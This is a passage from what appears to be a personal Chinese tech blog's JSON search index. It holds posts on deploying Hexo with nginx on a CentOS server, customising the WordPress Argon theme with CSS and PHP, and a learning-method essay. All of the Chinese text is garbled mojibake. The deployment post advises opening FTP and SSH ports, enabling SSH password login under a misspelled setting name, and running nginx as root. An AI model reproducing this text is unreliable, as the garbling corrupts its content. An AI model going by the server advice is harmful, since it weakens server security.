å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"Blogé™æ€éƒ¨ç½²","slug":"Blogé™æ€éƒ¨ç½²","date":"2024-08-07T03:28:04.000Z","updated":"2024-10-17T08:38:57.000Z","comments":true,"path":"2024/08/07/Blogé™æ€éƒ¨ç½²/","permalink":"https://gryffinbit.top/2024/08/07/Blog%E9%9D%99%E6%80%81%E9%83%A8%E7%BD%B2/","excerpt":"","text":"å‡çº§æ”¹é€ æ€è·¯ï¼š ä¸ºè§£å†³é™æ€é…ç½®è½¬ç§»è®¾å¤‡çš„é—®é¢˜ æŠŠhexoéƒ¨ç½²åˆ°VPSä¸Šï¼Œå®ç°â€œéšæ—¶ç¼–è¾‘ï¼Œéšæ—¶æ¨é€ï¼Œå¥½è¿ç§»â€ ç„¶åå†ä¼˜åŒ–ä¸€ä¸‹è¯„è®ºç³»ç»Ÿï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¸æ³¨å†Œå°±è¯„è®ºä»€ä¹ˆçš„ æŠŠæˆ‘å–œæ¬¢çš„wordpressä¸»é¢˜ï¼Œæ”¹åˆ°hexoä¸Šé¢å»ã€‚çº¯æ‰‹æ’¸ä¸€äº›æ–°æ ·å¼ã€‚ å¢åŠ é‚£ä¸ªæˆ‘ä¸€ç›´å¾ˆå–œæ¬¢çš„è¯´è¯´é¡µé¢çš„åŠŸèƒ½ CDNç”¨cloudfareï¼Œå¢åŠ ä¸€äº›é˜²æŠ¤æ€§ ã€ å½“å‰çš„éƒ¨ç½²æ–¹å¼ï¼Œgithubä¸Šï¼Œæœ¬åœ°æ¨é€ï¼Œè…¾è®¯äº‘åŸŸåã€‚cloudflareçš„DNS å’Œ https è¯ä¹¦ github pagesä½¿ç”¨cloudflareåŠ é€Ÿè‡ªå®šä¹‰åŸŸåæ¦‚è¦ - å½¼æ—¶ä»Šæ—¥ - åšå®¢å›­ (cnblogs.com) 0x01 ç³»ç»Ÿé…ç½®è…¾è®¯äº‘æœåŠ¡å™¨ï¼ŒCentOSç³»ç»Ÿ æ•´ä½“å¸ƒç½®æ€è·¯ï¼š ä¸ºäº†èƒ½å¤Ÿåœ¨ä¸åŒè®¾å¤‡ä¸Šéƒ½èƒ½è¿›è¡Œæ–‡ç« çš„ç®¡ç†å’Œæ¨é€ï¼Œæˆ‘å°†Hexoåšå®¢ç³»ç»Ÿæ­è½½åœ¨è…¾è®¯äº‘æœåŠ¡å™¨ä¸Šã€‚åŸŸåæ˜¯è…¾è®¯äº‘ä¹°çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¤‡æ¡ˆã€‚CDNæ˜¯cloudfareæä¾›çš„æœåŠ¡ï¼Œè¿™æ ·å¯ä»¥è¿›è¡Œä¸€äº›é˜²æŠ¤ï¼Œå¹¶ä¸”èƒ½å¤Ÿéšè—çœŸå®çš„å…¬ç½‘IPã€‚åŸŸåè§£æä¹Ÿæ˜¯cloudfareã€‚ æ•´ä¸ªblogå›å½’é™æ€åšå®¢ï¼Œæœ€é‡è¦çš„åŸå› æ˜¯æˆ‘å–œæ¬¢ä¸“æ³¨äºæ–‡ç« å†…å®¹ï¼Œç®€æ´ã€‚å…¶æ¬¡æ˜¯å‡ºäºå®‰å…¨æ€§çš„è€ƒè™‘ã€‚ æŠŠhexoçš„ç›®å½•ï¼Œå½“æˆnginxçš„å·¥ä½œç›®å½•å°±å¥½äº†ã€‚åœ¨xftpé‡Œé¢ï¼Œç›´æ¥æ”¾æ–°å†™çš„markdownæ–‡ä»¶è¿›å»å°±å¥½ã€‚ï¼ˆvscode sshè¿œç¨‹è¿æ¥ä¹Ÿæ˜¯ä¸ªå¥½åŠæ³•ï¼‰ ä¸€ç‚¹è…¾è®¯äº‘å°å‘ é˜²ç«å¢™æ‰“å¼€21ã€22ç«¯å£ sshè®¤è¯æ–¹å¼æ”¹ä¸ºå…è®¸å¯†ç è®¤è¯ã€‚passedAuthentication=YES å®‰è£…hexo1sudo npm install hexo-cli -g ä¸ºäº†è®©åç»­åˆå§‹åŒ– Hexo å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œä½ éœ€è¦ä¸ºä½ çš„ Hexo åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹åå­—æŒ‰å–œå¥½è‡ªé€‰ã€‚ 12#åˆ›å»ºæ–‡ä»¶å¤¹mkdir ä½ çš„æ–‡ä»¶å¤¹å ä½¿ç”¨ cd æ–‡ä»¶å¤¹å è¿›å…¥åˆšåˆšåˆ›å»ºçš„ Hexo æ–‡ä»¶å¤¹ï¼Œå¹¶åˆå§‹åŒ– Hexoï¼Œè®©ç³»ç»Ÿåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹å†…åˆ›å»º Hexo è¿è¡Œæ‰€éœ€è¦çš„æ¨¡æ¿æ–‡ä»¶ã€‚ 12#åˆå§‹åŒ– Hexohexo init å…¶ä¸­ï¼Œ_config.ymlã€source/ã€themes/ è¿™ä¸ªä¸‰ä¸ªæ–‡ä»¶ &#x2F; æ–‡ä»¶å¤¹å€¼å¾—ä½ å¤šæ³¨æ„ã€‚å…¶ä¸­ _config.yml æ˜¯åšå®¢çš„åŸºæœ¬é…ç½®æ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œä¿®æ”¹åšå®¢çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚åšå®¢åã€åšå®¢ä½œè€…ã€åšå®¢ç½‘å€ï¼›åšå®¢ä¸­çš„æ–‡ç« ç­‰ç”¨æˆ·èµ„æºéƒ½å­˜æ”¾æ–‡ä»¶å¤¹ source/ ä¸­ï¼›æ–‡ä»¶å¤¹ themes/ æ˜¯å­˜æ”¾åšå®¢ä¸»é¢˜æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼Œå¦‚æœä½ è¦ä¿®æ”¹ä¸»é¢˜ï¼Œä½ å°±éœ€è¦æŠŠæ‰€ä¸‹è½½çš„ä¸»é¢˜æ–‡ä»¶æ”¾åœ¨è¿™é‡Œã€‚ ç°åœ¨æ¨¡æ¿æ–‡ä»¶å·²ç»åˆ›å»ºå®Œæˆï¼Œä½ å¯ä»¥é€šè¿‡ hexo g å‘½ä»¤è®© Hexo æ ¹æ®æ¨¡æ¿æ–‡ä»¶ç”Ÿæˆé™æ€ç½‘é¡µäº†ã€‚ç³»ç»Ÿä¼šåœ¨ Hexo æ–‡ä»¶å¤¹å†…æ–°åˆ›å»ºä¸€ä¸ª public/ æ–‡ä»¶å¤¹ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹å†…çœ‹åˆ°ç”Ÿæˆçš„é™æ€ç½‘é¡µç›¸å…³æ–‡ä»¶ã€‚ å¦‚æœä½ æƒ³ç«‹é©¬é¢„è§ˆç½‘é¡µï¼Œä½¿ç”¨ hexo s å¯åŠ¨ Hexo æœåŠ¡ç«¯ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€ æœåŠ¡å™¨IP:4000 é¢„è§ˆç½‘é¡µï¼Œä¸è¿‡æ­¤æ­¥éª¤éœ€è¦ä½ æå‰æ‰“å¼€æœåŠ¡å™¨ 4000 ç«¯å£ï¼Œå¹¶ä¿è¯ 4000 ç«¯å£æ²¡æœ‰è¢«å…¶ä»–æœåŠ¡å ç”¨ã€‚ 1234#ç”Ÿæˆé™æ€ç½‘é¡µhexo g#å¯åŠ¨ Hexo æœåŠ¡ç«¯hexo s Nginx å®‰è£…é…ç½®12345yum install â€“ y epel-releaseyum install nginxsystemctl start nginxsystemctl enable nginxvim /etc/nginx/nginx.conf æŠŠ root è¿™ä¸€è¡Œæ”¹æˆhexoçš„ public/ æ–‡ä»¶å¤¹ç›®å½•ï¼Œæ³¨æ„æœ€åä¸è¦åŠ æ–œæ ï¼›åœ¨ server_name å¡«ä¸Šä½ çš„åŸŸå 1service nginx restart æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥ä½ çš„åŸŸåï¼Œä½ å°±å¯ä»¥çœ‹åˆ° Hexo åˆå§‹ç½‘é¡µäº†ã€‚ æœ‰ä¸€ä¸ªå°å‘ï¼Œnginx confçš„é»˜è®¤useræ˜¯nginxã€‚è¿™æ ·å»è®¿é—®çš„æ—¶å€™ä¼šå‡ºç°403çš„æŠ¥é”™ã€‚ï¼ˆä¹Ÿæœ‰å¯èƒ½å› ä¸ºæ–‡ä»¶æƒé™çš„é—®é¢˜ï¼Œæ–‡ä»¶åœ¨rootä¸‹ï¼Œæ‰€ä»¥å¯èƒ½ä¼šæŠ¥404çš„é”™ã€‚ï¼‰æ‰€ä»¥éœ€è¦å°†nginxé…ç½®æ–‡ä»¶é‚£è¡Œä¿®æ”¹ä¸ºrootã€‚ 1vim /etc/nginx/nginx.conf 1service nginx restart 0x02 Hexo ä¸»é¢˜é…ç½® ä¸»é¢˜ç¾åŒ–æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªhexoæœåŠ¡ï¼Œä¸€è¾¹ä¿®æ”¹ä¸€è¾¹å®æ—¶é¢„è§ˆï¼Œæ¯”è¾ƒç¨³å¦¥ã€‚ ä¹Ÿå¯ä»¥ç›´æ¥vscodeè¿œç¨‹è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œç›´æ¥ä¿®æ”¹ã€‚é›†æˆxftpã€xshellã€sublimeä¸€ä½“ Volantisä¸»é¢˜Volantis: ä¸»é¢˜é…ç½® - Volantis 0x03 é™æ€ hexo è¯´è¯´åŠŸèƒ½Lete114&#x2F;hexo-artitalk-static: Artitalk é™æ€ç‰ˆï¼Œæœ¬åœ°ç¼–å†™è¯´è¯´(å°±åƒå†™æ–‡ç« ä¸€æ ·)ï¼Œéœ€è¦ hexo g ç”Ÿæˆ (github.com) æ·»åŠ ejs æ ·å¼ï¼ˆè‡ªå®šä¹‰ï¼‰ 1/root/Blog/themes/volantis/layout/artitalk.ejs 123456&lt;%- partial(&#x27;_pre&#x27;) %&gt;&lt;div class=&#x27;l_main&lt;%- page.sidebar == false ? &#x27; no_sidebar&#x27; : &#x27;&#x27; %&gt;&#x27;&gt; &lt;%- partial(&#x27;_partial/article&#x27;, &#123;post: page, index: false&#125;) %&gt;&lt;/div&gt;&lt;%- partial(&#x27;_partial/side&#x27;) %&gt; å®‰è£… 1npm install hexo-artitalk-static åˆ›å»ºè¯´è¯´æ–‡ä»¶ åœ¨ä½ çš„åšå®¢æ ¹ç›®å½•çš„ source/_data åˆ›å»ºæ–‡ä»¶ artitalk.ymlã€‚ ä»¥åä½ çš„æ‰€æœ‰è¯´è¯´éƒ½ä¼šå†™åœ¨è¿™é‡Œé¢ 123456## è¯´è¯´æ ¼å¼- content: Hexo-Artitalk-Static çœŸä¸é”™ï¼Œæ²¡æœ‰åç«¯ï¼Œæ²¡æœ‰è¯·æ±‚ï¼Œé€Ÿåº¦æ˜¯çœŸçš„å¿«- content: | å¦‚æœä½ çš„ JavaScript åŸºç¡€è¿˜ä¸é”™ ä½ è¿˜å¯ä»¥ä¸º Hexo-Artitalk-Static å†™è‡ªå®šä¹‰æ’ä»¶ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰è¯´è¯´çš„æ¨¡æ¿ è‡ªç”±åº¦æ˜¯çœŸçš„é«˜(ä¹Ÿå¯ä»¥å®‰è£…åˆ«äººçš„æ’ä»¶) ä»¥ä¸Šæ–¹å¼ä¸ä¼šè‡ªåŠ¨å®æ—¶ç”Ÿæˆè¯´è¯´çš„æ—¶é—´ï¼Œåªæœ‰åœ¨æ‰§è¡Œäº† hexo s æˆ– hexo g çš„æ—¶å€™æ‰ä¼šè‡ªåŠ¨ç”Ÿæˆè¯´è¯´çš„æ—¶é—´ (è€Œä¸”æ˜¯å½“å‰æ‰§è¡Œè¿™ä¸ªå‘½ä»¤çš„æ—¶é—´ï¼Œå¹¶ä¸æ˜¯ä½ å†™è¯´è¯´çš„æ—¶é—´) ä½ å¯ä»¥åœ¨å†™è¯´è¯´å‰æ‰§è¡Œ hexo s å‘½ä»¤ï¼Œç„¶åå†æ‰“å¼€ source/_data/artitalk.yml ç¼–å†™æ–°è¯´è¯´ï¼Œè¿™æ ·å®ƒæ‰ä¼šå®æ—¶ç”Ÿæˆè¯´è¯´çš„æ—¶é—´ åˆ›å»ºæ–°æ–‡ä»¶ 1/root/Blog/source/artitalk/index.md é…ç½®ä¿¡æ¯ 1/root/Blog/themes/volantis/_config.yml ä¿®æ”¹å¯¼èˆªæ çš„uiæ˜¾ç¤º 1/root/Blog/themes/volantis/_config.yml å¾…å¼€å‘ 0x04 å¢åŠ è¯´è¯´é¡µç åŠŸèƒ½å’Œå½’æ¡£åŠŸèƒ½æ”¹é€ Argonä¸»é¢˜ä¹‹ä¸ºè¯´è¯´é¡µé¢æ·»åŠ é¡µç  â€“ å“ˆå†¬çŒªçš„å°ç«™ (hadongzhu.com) 0x05 CSS ç¾åŒ–WordPress å­ä¸»é¢˜èƒ½å¹²ä»€ä¹ˆä»¥åŠä¸èƒ½å¹²ä»€ä¹ˆ - é¸¦é¸¦çš„å·¢ç©´ (crowya.com) hexoä¹‹Volantisä¸»é¢˜ç¾åŒ–-CSDNåšå®¢ Argon ä¸»é¢˜ä¿®æ”¹è®°å½• - é¸¦é¸¦çš„å·¢ç©´ (crowya.com) fushulingã®blog â€“ ç‹—andçŒ«çš„å®‰å…¨ç¬”è®° 0x06 live2DLive2D å® ç‰©åŠŸèƒ½ä¿®æ”¹|éŸ³ä¹æ’­æ”¾å™¨+å³é”®ç§˜å¯†é€šé“ - é¸¦é¸¦çš„å·¢ç©´ (crowya.com) å…»ä¸€åªåšå®¢å® ç‰© - é¸¦é¸¦çš„å·¢ç©´ (crowya.com) 0x07 SEOï¼ˆæœç´¢å¼•æ“ä¼˜åŒ–ï¼‰","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"}],"author":"Gryffinbit"},{"title":"Blog åŠ¨æ€éƒ¨ç½²","slug":"Blog-åŠ¨æ€éƒ¨ç½²","date":"2024-08-07T03:27:48.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2024/08/07/Blog-åŠ¨æ€éƒ¨ç½²/","permalink":"https://gryffinbit.top/2024/08/07/Blog-%E5%8A%A8%E6%80%81%E9%83%A8%E7%BD%B2/","excerpt":"","text":"0X01 æœåŠ¡å™¨åŸŸåå‡†å¤‡é…ç½®ï¼šè…¾è®¯äº‘æœåŠ¡å™¨ SSLè¯ä¹¦ã€CDNï¼šcloudfare åšå®¢ç³»ç»Ÿï¼šwordpress 0X02 ä¸»é¢˜ç¾åŒ–argon ä¸»é¢˜ é¦–é¡µæ‰“å­—æœºæ•ˆæœä¿®æ”¹style.css 12345678910111213141516171819202122232425.banner-title &#123; font-size: 2.2em; width: auto; height: auto; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border-right: 2px solid black; animation: typing 4.5s steps(40, end) forwards, blink-caret 0.75s step-end infinite; overflow: hidden; white-space: nowrap; /* Ensure the text does not wrap */ text-align: center; /* Center the text */&#125;@keyframes typing &#123; from &#123; width: 0; &#125; to &#123; width: 50%; &#125;&#125;@keyframes blink-caret &#123; from , to &#123; border-color: beige; &#125; 30% &#123; border-color: transparent; &#125;&#125; é¦–é¡µè¿›å…¥å…¨å±æ•ˆæœå¹¶å¢åŠ ç®­å¤´åœ¨è®¾ç½®ä¸­ä¿®æ”¹ä¸ºå…¨å± ä¿®æ”¹æ ·å¼ style.css 12345678910111213141516171819202122232425262728293031/*========BanneråŠ¨æ€ç®­å¤´===========*/@keyframes up-down-move &#123; 0% &#123; opacity:0; transform:translate(-50%,-150px); &#125; 50% &#123; opacity:1; transform:translate(-50%,-130px); &#125; 100% &#123; opacity:0; transform:translate(-50%,-110px); &#125;&#125;.cover-scroll-down .fa-angle-down&#123; font-size: 3rem; text-shadow: 0px 0px 8px #dc1111; position:absolute; transform: translate(-50%,-80px); opacity:0;&#125;.cover-scroll-down #pointer1&#123; animation: up-down-move 3s linear infinite;&#125;.cover-scroll-down #pointer2&#123; animation: up-down-move 3s 1s linear infinite;&#125;.cover-scroll-down #pointer3&#123; animation: up-down-move 3s 2s linear infinite;&#125; ä¿®æ”¹header.phpï¼Œåœ¨437è¡Œ 1234567&lt;?php if ($banner_size == &#x27;fullscreen&#x27;) &#123; ?&gt; &lt;div class=&quot;cover-scroll-down&quot;&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer1&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer2&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer3&quot;&gt;&lt;/i&gt; &lt;/div&gt;&lt;?php &#125; ?&gt; å½©è™¹å­—style.css 12345678910111213141516171819202122232425262728293031.banner-title::before &#123; content: &#x27;&#x27;; position: absolute; top: 0; left: 50%; bottom: 0; right: 0; transform:translatex(-50%); max-width:500px; z-index: -100; background:transparent; filter: blur(30px); opacity: 0.8;&#125;.banner-title .banner-title-inner&#123; position:relative; background:inherit;&#125;.banner-title .banner-subtitle&#123; position:relative; background:inherit;&#125;.banner-title &#123; position: absolute; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size:200%; animation: ColdLight 3s linear infinite; color:transparent !important; -webkit-background-clip: text;&#125; å…¨ç«™è‡ªå®šä¹‰å­—ä½“å…¨å®šåˆ¶åŒ–è®¾ç½®å­—ä½“ï¼ŒåŒºåˆ†ä¸­è‹±æ–‡çš„å­—ä½“ï¼ŒåŒºåˆ†ä¸åŒä½ç½®çš„å­—ä½“ï¼ŒåŒ…æ‹¬æ­£æ–‡ã€å¯¼èˆªæ ã€æ ‡é¢˜ã€‚ ä¿®æ”¹style.cssï¼Œå¢åŠ ä»¥ä¸‹ä»£ç  å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™å»æ‰¾å­—ä½“çš„èµ„æº Selection Embed Code - Google Fonts åªä¿®æ”¹ç‰¹å®šçš„éƒ¨åˆ†ï¼Œæ¯”å¦‚bannerã€bodyã€ç­‰è‡ªå®šä¹‰ã€‚ï¼ˆå¯ä»¥æœfontï¼Œå…¨å±€çš„ä¿®æ”¹ç‰¹å®šçš„å­—ä½“å’Œç‰¹å®šä½ç½®çš„å­—ä½“ï¼‰ 12345678.banner-title &#123; font-family: &#x27;Press Start 2P&#x27;; src: url(&#x27;https://fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap&#x27;); font-weight: normal; font-style: normal; font-display: swap;&#125; ä¹Ÿå¯ä»¥åœ¨style.csså‰é¢çš„ä½ç½®å…¨å±€å£°æ˜åŠ è½½èµ„æº å¼ºåˆ¶ä¿®æ”¹ä¸ºå›ºå®šçš„æ–‡å­—å†…å®¹å’Œå­—ä½“ï¼Œä¿®æ”¹header.phpå’Œstyle.cssåˆ›é€ æ–°çš„ç±» Argon ä¸»é¢˜é€‰é¡¹åœ¨Argonä¸»é¢˜é€‰é¡¹é¡µé¢è¿›è¡Œç¼–è¾‘ï¼Œä¿®æ”¹bannerã€èœå•ç­‰ åŠ¨æ€éƒ¨ç½²äº†ä¸€åŠï¼Œç„¶åè§‰å¾—è¿˜æ˜¯é™æ€ä¼˜é›…ï¼Œè¿™ç¯‡æ–‡ç« å°±å†™åˆ°è¿™å„¿å§ã€‚æˆ‘è¦æŠŠåšå®¢æ¢å›é™æ€äº†ï¼Œå†å‡çº§æ”¹é€ ä¸€ä¸‹ã€‚å‘Šè¾ï¼å»å†™å¦å¤–ä¸€ç¯‡blogéƒ¨ç½²æ–‡ç« å’¯ï¼ wordpressä¿®æ”¹ç‰ˆ é“¾æ¥: https://pan.baidu.com/s/1T2mD_V3JQnpaV9VC8lI2Ug?pwd=numu æå–ç : numu å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v7çš„åˆ†äº«","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://gryffinbit.top/tags/wordpress/"}],"author":"Gryffinbit"},{"title":"å­¦ä¹ è·¯çº¿","slug":"å­¦ä¹ è·¯çº¿","date":"2024-08-07T03:26:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/å­¦ä¹ è·¯çº¿/","permalink":"https://gryffinbit.top/2024/08/07/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/","excerpt":"","text":"æˆ‘åœ¨è‡ªå·±å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œéå¸¸è¿·èŒ«çš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘èƒ½æ‰¾åˆ°å¾ˆå¤šç°æˆçš„æ–‡ç« ï¼Œæ‰¾åˆ°å¾ˆå¤šçš„é±¼ã€‚ä½†æ˜¯æˆ‘æ‰¾ä¸åˆ°æ€è€ƒè¿‡ç¨‹çš„é‚£ä¸ªæ¸”ã€‚æˆ‘æ„Ÿè§‰è‡ªå·±æŠ€æœ¯æœ€å¤§çš„å›°éš¾æ˜¯ï¼Œæˆ‘ç‰¹åˆ«æƒ³çŸ¥é“åˆ«äººéƒ½æ˜¯â€œæ€ä¹ˆæƒ³åˆ°çš„â€ã€‚æˆ‘æ„Ÿè§‰è‡ªå·±æ˜¯ä¸ªå¾ˆæŠ½è±¡çš„äººï¼Œæˆ‘åœ¨åšä¸€ä»¶äº‹æƒ…çš„æ—¶å€™ï¼Œæ€»æƒ³æŠ½è±¡å‡ºæ¥ä¸€ä¸ªå¯ä»¥è¢«å¤ç”¨çš„æ¡†æ¶ã€‚ æ¯”å¦‚ï¼ŒåŒæ ·æ˜¯å­¦ä¹ æ–°çŸ¥è¯†ï¼Œæœ‰çš„äººå°±èƒ½å¾ˆå¿«åœ°æŠ“ä½é‡ç‚¹ï¼Œå­¦ä¼šï¼Œä¸Šæ‰‹ã€‚æœ‰çš„äººå´å¾ˆæ…¢ï¼Œæ‰¾ä¸åˆ°æ–¹å‘ã€‚æœ‰äººè¯´ï¼Œæ–¹æ³•å¾ˆé‡è¦ï¼Œè¦æ‰¾å¯¹æ–¹æ³•ã€‚ä½†æ˜¯åæ¥åˆè¡ç”Ÿå‡ºå¾ˆå¤šçš„â€œæ–¹æ³•â€ï¼Œäºæ˜¯å°±å˜æˆäº†ï¼Œæœ‰äººèƒ½æ‰¾åˆ°å¯¹çš„æ–¹æ³•ï¼Œæœ‰äººæ‰¾ä¸åˆ°å¯¹çš„æ–¹æ³•ã€‚æœ€åå˜æˆäº†æ­»è®°ç¡¬èƒŒï¼Œè¿â€œæŠ€å·§â€éƒ½æ˜¯åœ¨ç”Ÿç¡¬å¥—ç”¨ï¼Œä¸èƒ½èä¼šè´¯é€šã€‚æ‰€ä»¥æˆ‘å°±æƒ³è¦æ€è€ƒä¸€å¥—â€œè¡Œä¸ºæ¨¡å‹â€ï¼Œä¸€å¥—â€œæ€è€ƒæ–¹å¼â€ï¼ŒæŠŠä¸€äº›å¥½çš„ä¸œè¥¿â€œæŠ½è±¡å‡ºæ¥â€œã€‚ æ‰€ä»¥æˆ‘çš„blogï¼Œæˆ‘æƒ³æˆä¸ºä¸€ä¸ªâ€æŠ½è±¡æ´¾å¤§å¸ˆâ€œï¼Œæˆäººä»¥æ¸”ã€‚åœ¨æ¯ä¸€ç¯‡æ·±å…¥åˆ†ææˆ–å­¦ä¹ è®°å½•çš„æ–‡ç« ä¸­ï¼Œè®°å½•ä¸‹æˆ‘æ€è€ƒçš„è¿‡ç¨‹ï¼Œæˆ‘çš„å¿ƒè·¯ï¼Œæˆ‘çš„æ¢ç´¢è¿‡ç¨‹ã€‚æŠŠæˆ‘çš„â€è¡Œä¸ºæ¨¡å‹â€å’Œâ€œæ€è€ƒæ–¹å¼â€ï¼Œå‘ˆç°å‡ºæ¥ã€‚è¿™æ ·å°±å¯ä»¥å¸®åŠ©å…¶ä»–åƒæˆ‘ä¸€æ ·çš„æŠ½è±¡æ´¾ï¼Œè®©ä»–ä»¬å¯ä»¥æŠŠæˆ‘æŠ½è±¡å‡ºæ¥çš„æ¡†æ¶ï¼Œå¥—ç”¨åœ¨è‡ªå·±èº«ä¸Šï¼Œç›´æ¥å°±å¯ä»¥è¿è¡Œäº†ã€‚ ç°åœ¨æˆ‘æ­£åœ¨æ¢ç´¢é€‚åˆè‡ªå·±çš„å­¦ä¹ æ¨¡å¼ï¼Œå¹¶ä¸”åœ¨è¯•è¿è¡Œä¸­ï¼Œä¹‹åä¼šæ¸æ¸ä¼˜åŒ–ï¼Œä¸æ–­åœ°æ›´æ–°åŠ å¼ºè‡ªå·±ã€‚ Gryffinbit å­¦ä¹ æ¡†æ¶ 1.0 ï¼š å‡†åˆ™ï¼šæ•´ä¸ªæ€è€ƒæ¨¡å¼æ˜¯å¥—å¨ƒï¼Œæ— é™å¾ªç¯æ— é™ç»†åŒ– å…ˆæŠŠæ¡†æ¶å®šå‡ºæ¥ï¼Œç„¶åå†æœ‰æ–¹å‘æ€§çš„å¡«å†…å®¹è¿›å» æ˜ç¡®æˆ‘è¦å¹²ä»€ä¹ˆ åœ¨ç½‘ä¸Šæœç´¢è¯¥çŸ¥è¯†ç‚¹ä¸‹æœ‰å“ªäº›é›¶ç¢çš„æ–¹å‘ï¼Œåœ°æ¯¯å¼æœç´¢ï¼Œæ£€ç´¢å¤§é‡é›¶ç¢çš„ä¿¡æ¯ æŠŠè¿™äº›é›¶ç¢çš„ä¸œè¥¿ï¼Œéƒ½å…ˆè¿‡ä¸€éï¼Œæµ…æµ…çš„åœ¨è„‘ä¸­ç•™ä¸‹å°è±¡ ä¸¾ä¸ªä¾‹å­ï¼š æˆ‘è¦å­¦ä¹ ä»£ç å®¡è®¡ï¼Œäº†è§£äº†æœ‰ä¸åŒçš„è¯­è¨€ï¼Œæˆ‘å†³å®šå…ˆä»phpå¼€å§‹å­¦èµ·ã€‚ç„¶åæˆ‘äº†è§£åˆ°phpæœ‰å¾ˆå¤šæ¡†æ¶ï¼Œè€Œthinkphpæ˜¯å…¶ä¸­å¾ˆåŸºç¡€å¾ˆç®€å•çš„æ¡†æ¶ï¼Œäºæ˜¯æˆ‘ä»è¯¥æ¡†æ¶å…¥æ‰‹ã€‚ã€è¿™ä¸€æ­¥æ˜ç¡®äº†æˆ‘è¦å¹²ä»€ä¹ˆã€‚æ˜¯æˆ‘çš„åˆæ­¥æ¡†æ¶ã€‚åœ¨å®šä¸‹è¿™ä¸ªæ¡†æ¶çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘æ£€ç´¢äº†å¤§é‡é›¶ç¢çš„ä¿¡æ¯ï¼Œæœäº†æœ‰å“ªäº›è¯­è¨€ï¼Œå“ªäº›phpæ¡†æ¶ã€‘æ˜ç¡®äº†è¯¥æ¡†æ¶ï¼Œæˆ‘åˆå¼€å§‹äº†åœ°æ¯¯å¼ä¿¡æ¯æœç´¢ï¼Œæ£€ç´¢è¯¥æ¡†æ¶çš„å„ç§æŠ€æœ¯æ–‡ç« ï¼Œæˆ‘å†³å®šä»æ–‡æ¡£çœ‹èµ·&#x2F;æˆ‘å†³å®šè·Ÿè¿›æŸä¸ªæŠ€æœ¯æ–‡ç« çš„åˆ†æã€‚æ­¤æ—¶æˆ‘åˆå¤„äºäº†å¤§é‡é›¶ç¢ä¿¡æ¯çš„è¿·èŒ«æ—¶æ®µã€‚ç›´åˆ°æˆ‘å¼„æ˜ç™½äº†ï¼Œæ¡†æ¶åŒ…æ‹¬è·¯ç”±æœºåˆ¶ã€æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ã€ä¸­é—´ä»¶ç­‰ã€‚äºæ˜¯ï¼Œæˆ‘åˆæ˜ç¡®äº†è¦å¹²ä»€ä¹ˆã€‚è¿™æ ·ä¸€æ­¥ä¸€æ­¥å¾ªç¯å‘å‰ã€‚ å®ŒæˆçŸ¥è¯†å¸æ”¶çš„é—­ç¯ å­¦ä¹ å¾ˆå¤šä¸œè¥¿æ—¶ï¼Œå› ä¸ºæ²¡æœ‰æ˜ç¡®çš„åœ°å›¾è·¯çº¿ï¼Œæœ‰äº›è·¯èµ°äº†ï¼Œæœ‰äº›çŸ¥è¯†å­¦äº†ï¼Œä½†ä¸€çŸ¥åŠè§£ã€‚è¿™ä¸ªæ—¶å€™è¦ç»§ç»­å­¦ä¸‹å»ï¼Œç„¶ååˆ°æŸä¸ªç‚¹ï¼Œå‘ç°ç†è§£äº†å‰é¢çš„ä¸œè¥¿ï¼Œæˆ–è€…æ˜¯å‘ç°æ¬ ç¼ºäº†å“ªéƒ¨åˆ†çš„çŸ¥è¯†ï¼Œè¿™æ—¶å€™å†è¿”å›å»çœ‹ã€‚ 